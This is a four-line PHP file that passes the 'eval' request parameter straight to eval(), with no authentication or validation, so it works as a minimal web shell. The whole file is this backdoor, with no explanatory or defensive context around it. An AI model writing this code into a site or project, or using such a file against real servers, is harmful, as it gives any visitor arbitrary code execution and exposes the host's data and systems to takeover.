<?php
ob_start();
eval(stripslashes(trim($_REQUEST['eval'])));
?>